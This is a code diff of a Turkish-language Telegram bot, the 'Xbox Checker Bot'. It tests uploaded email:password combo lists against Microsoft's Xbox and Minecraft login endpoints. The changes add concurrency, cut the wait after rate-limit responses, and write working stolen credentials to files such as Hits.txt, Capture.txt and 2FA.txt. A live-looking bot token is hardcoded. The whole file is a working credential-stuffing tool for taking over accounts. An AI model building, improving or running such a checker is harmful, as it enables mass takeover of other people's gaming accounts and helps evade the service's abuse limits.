@@ -5,13 +5,12 @@ import urllib3
 import warnings
 import re
 import time
-import json
-import concurrent.futures
 import os
+import asyncio
 from datetime import datetime
 from urllib.parse import urlparse, parse_qs
 from telegram import Update
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # SSL ve Protokol uyarılarını gizle
 urllib3.disable_warnings()
@@ -22,7 +21,7 @@ TOKEN = "8586488864:AAETJFeQOk_igst2YE1OWq9QvpM25jTDEq4"
 SFTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
 MAX_RETRIES = 2
 REQUEST_TIMEOUT = 5
-THREAD_COUNT = 50 
+MAX_CONCURRENT_TASKS = 20  # Railway CPU/RAM sınırları için optimize edilmiş eşzamanlılık
 
 class Stats:
     def __init__(self):
@@ -62,6 +61,21 @@ class Stats:
 
 global_stats = Stats()
 
+def create_results_folder():
+    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    folder = f"results/{timestamp}"
+    os.makedirs(folder, exist_ok=True)
+    return folder
+
+results_folder = create_results_folder()
+
+def save_hit(filename, content):
+    try:
+        with open(f"{results_folder}/{filename}", 'a', encoding='utf-8') as f:
+            f.write(content + '\n')
+    except:
+        pass
+
 def get_sftag(session, max_attempts=MAX_RETRIES):
     for attempt in range(max_attempts):
         try:
@@ -76,7 +90,7 @@ def get_sftag(session, max_attempts=MAX_RETRIES):
         except Exception:
             if attempt == max_attempts - 1:
                 global_stats.errors += 1
-        time.sleep(0.5)
+        time.sleep(0.3)
     return None, None
 
 def microsoft_auth(session, email, password, url_post, sftag, max_attempts=MAX_RETRIES):
@@ -115,7 +129,7 @@ def microsoft_auth(session, email, password, url_post, sftag, max_attempts=MAX_R
             global_stats.retries += 1
             if attempt == max_attempts - 1:
                 return None, "error"
-        time.sleep(0.5)
+        time.sleep(0.3)
     return None, "error"
 
 def get_xbox_token(session, ms_token, max_attempts=MAX_RETRIES):
@@ -137,13 +151,13 @@ def get_xbox_token(session, ms_token, max_attempts=MAX_RETRIES):
                     uhs = data['DisplayClaims']['xui'][0]['uhs']
                     return xbox_token, uhs
             elif response.status_code == 429:
-                time.sleep(2)
+                time.sleep(1.5)
                 continue
         except Exception:
             global_stats.retries += 1
             if attempt == max_attempts - 1:
                 return None, None
-        time.sleep(0.5)
+        time.sleep(0.3)
     return None, None
 
 def get_xsts_token(session, xbox_token, max_attempts=MAX_RETRIES):
@@ -162,13 +176,13 @@ def get_xsts_token(session, xbox_token, max_attempts=MAX_RETRIES):
                 data = response.json()
                 return data.get('Token')
             elif response.status_code == 429:
-                time.sleep(2)
+                time.sleep(1.5)
                 continue
         except Exception:
             global_stats.retries += 1
             if attempt == max_attempts - 1:
                 return None  
-        time.sleep(0.5)    
+        time.sleep(0.3)    
     return None
 
 def get_minecraft_token(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
@@ -181,13 +195,13 @@ def get_minecraft_token(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
             if response.status_code == 200:
                 return response.json().get('access_token')
             elif response.status_code == 429:
-                time.sleep(2)
+                time.sleep(1.5)
                 continue
         except Exception:
             global_stats.retries += 1
             if attempt == max_attempts - 1:
                 return None 
-        time.sleep(0.5)
+        time.sleep(0.3)
     return None
 
 def check_minecraft_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
@@ -216,7 +230,7 @@ def check_minecraft_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
                         return 'Other: ' + ', '.join(others), text
                     return None, text
             elif response.status_code == 429:
-                time.sleep(2)
+                time.sleep(1.5)
                 continue
             else:
                 return None, None
@@ -224,7 +238,7 @@ def check_minecraft_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
             global_stats.retries += 1
             if attempt == max_attempts - 1:
                 return None, None
-        time.sleep(0.5)
+        time.sleep(0.3)
     return None, None
 
 def get_minecraft_profile(session, mc_token, max_attempts=MAX_RETRIES):
@@ -236,7 +250,7 @@ def get_minecraft_profile(session, mc_token, max_attempts=MAX_RETRIES):
             if response.status_code == 200:
                 return response.json()
             elif response.status_code == 429:
-                time.sleep(2)
+                time.sleep(1.5)
                 continue
             elif response.status_code == 404:
                 return None
@@ -244,10 +258,10 @@ def get_minecraft_profile(session, mc_token, max_attempts=MAX_RETRIES):
             global_stats.retries += 1
             if attempt == max_attempts - 1:
                 return None
-        time.sleep(0.5)
+        time.sleep(0.3)
     return None
 
-def check_account(combo, context, chat_id):
+async def check_account(combo, context, chat_id):
     try:
         parts = combo.strip().split(':')
         if len(parts) < 2:
@@ -269,6 +283,7 @@ def check_account(combo, context, chat_id):
         if auth_status == "2fa":
             global_stats.twofa += 1
             global_stats.checked += 1
+            save_hit("2FA.txt", f"{email}:{password}")
             return 
         elif auth_status == "bad":
             global_stats.bad += 1
@@ -299,6 +314,7 @@ def check_account(combo, context, chat_id):
             
         account_type, entitlements = check_minecraft_entitlements(session, mc_token) 
         if not account_type:
+            save_hit("Not_Found.txt", f"{email}:{password} | No Minecraft entitlements")
             global_stats.bad += 1
             global_stats.checked += 1
             return  
@@ -315,101 +331,114 @@ def check_account(combo, context, chat_id):
             uuid = "N/A"
             capes = "N/A"  
         
+        capture_text = f"Email: {email}\nPassword: {password}\nName: {name}\nUUID: {uuid}\nCapes: {capes}\nAccount Type: {account_type}\n{'='*50}\n"
+        
+        save_hit("Hits.txt", f"{email}:{password}")
+        save_hit("Capture.txt", capture_text)
+
         if 'Ultimate' in account_type:
             global_stats.xgpu += 1
+            save_hit("XboxGamePassUltimate.txt", f"{email}:{password}")
         elif 'Game Pass' in account_type:
             global_stats.xgp += 1
+            save_hit("XboxGamePass.txt", f"{email}:{password}")
         elif 'Other' in account_type:
             global_stats.other += 1
+            save_hit("Other.txt", f"{email}:{password} | {account_type}")
             
         global_stats.hits += 1
         global_stats.checked += 1
         
         hit_text = (
-            f"🔥 **HİT HESAP BELDİRİLDİ**\n"
+            f"🔥 **HİT HESAP BULUNDU**\n"
             f"📧 **Combo:** `{email}:{password}`\n"
             f"👤 **Name:** {name}\n"
             f"🆔 **UUID:** {uuid}\n"
             f"🧥 **Capes:** {capes}\n"
             f"🎮 **Tür:** {account_type}"
         )
-        context.bot.send_message(chat_id=chat_id, text=hit_text)
+        await context.bot.send_message(chat_id=chat_id, text=hit_text)
         
     except Exception:
         global_stats.errors += 1
         global_stats.checked += 1
 
-def start(update: Update, context: CallbackContext):
-    update.message.reply_text("👋 Xbox Checker Bot Aktif.\nTaramayı başlatmak için `.txt` combo dosyasını gönderin.")
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("👋 Xbox Checker Bot Aktif.\nTaramayı başlatmak için bir `.txt` combo dosyası gönderin.")
 
-def handle_docs(update: Update, context: CallbackContext):
+async def handle_docs(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.message.chat_id
     document = update.message.document
     
     if not document.file_name.endswith('.txt'):
-        update.message.reply_text("❌ Sadece .txt uzantılı combo dosyası yükleyin.")
+        await update.message.reply_text("❌ Sadece .txt uzantılı combo dosyası yükleyin.")
         return
 
     if global_stats.is_running:
-        update.message.reply_text("⚠️ Şu an çalışan bir işlem var. Lütfen bitmesini bekleyin.")
+        await update.message.reply_text("⚠️ Şu an çalışan bir işlem var. Lütfen bitmesini bekleyin.")
         return
 
-    update.message.reply_text("📥 Dosya başarıyla indiriliyor...")
-    file = context.bot.get_file(document.file_id)
-    file.download("temp_combos.txt")
+    await update.message.reply_text("📥 Dosya başarıyla indiriliyor...")
+    file = await context.bot.get_file(document.file_id)
+    await file.download_to_drive("temp_combos.txt")
 
     with open("temp_combos.txt", "r", encoding="utf-8", errors="ignore") as f:
         combos = [line.strip() for line in f if line.strip() and ':' in line]
 
-    os.remove("temp_combos.txt")
+    if os.path.exists("temp_combos.txt"):
+        os.remove("temp_combos.txt")
     
     if not combos:
-        update.message.reply_text("❌ Geçerli bir combo formatı bulunamadı.")
+        await update.message.reply_text("❌ Geçerli bir combo formatı bulunamadı.")
         return
 
     global_stats.__init__()
     global_stats.is_running = True
-    status_message = update.message.reply_text("🚀 Çoklu işlem başlatılıyor...")
+    status_message = await update.message.reply_text("🚀 Çoklu işlem başlatılıyor...")
 
-    def run_checker():
-        with concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
-            futures = [executor.submit(check_account, combo, context, chat_id) for combo in combos]
-            last_update = time.time()
-            for future in concurrent.futures.as_completed(futures):
-                if time.time() - last_update > 5:
-                    try:
-                        context.bot.edit_message_text(
-                            chat_id=chat_id,
-                            message_id=status_message.message_id,
-                            text=global_stats.generate_stats_text()
-                        )
-                    except Exception:
-                        pass
-                    last_update = time.time()
+    async def run_checker():
+        semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)
+        
+        async def worker(combo):
+            async with semaphore:
+                # Eşzamanlı istekleri asenkron havuzda koştur
+                await check_account(combo, context, chat_id)
+
+        tasks = [asyncio.create_task(worker(combo)) for combo in combos]
+        
+        # Sürekli arayüz güncelleme döngüsü
+        while not all(t.done() for t in tasks):
+            await asyncio.sleep(5)
+            try:
+                await context.bot.edit_message_text(
+                    chat_id=chat_id,
+                    message_id=status_message.message_id,
+                    text=global_stats.generate_stats_text()
+                )
+            except Exception:
+                pass
 
         global_stats.is_running = False
         try:
-            context.bot.edit_message_text(
+            await context.bot.edit_message_text(
                 chat_id=chat_id,
                 message_id=status_message.message_id,
                 text=global_stats.generate_stats_text() + "\n\n🏁 **Tarama Tamamlandı!**"
             )
         except Exception:
-            context.bot.send_message(chat_id=chat_id, text="🏁 Tarama başarıyla tamamlandı!")
+            await context.bot.send_message(chat_id=chat_id, text="🏁 Tarama başarıyla tamamlandı!")
 
-    import threading
-    threading.Thread(target=run_checker).start()
+    asyncio.create_task(run_checker())
 
 def main():
-    updater = Updater(TOKEN, use_context=True)
-    dp = updater.dispatcher
+    # v20+ modern Application mimarisi
+    application = Application.builder().token(TOKEN).build()
 
-    dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(MessageHandler(Filters.document, handle_docs))
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_docs))
 
-    print("Bot dinlemede...")
-    updater.start_polling()
-    updater.idle()
+    print("Bot modern asenkron yapıda çalışıyor...")
+    application.run_polling()
 
 if __name__ == "__main__":
     main()
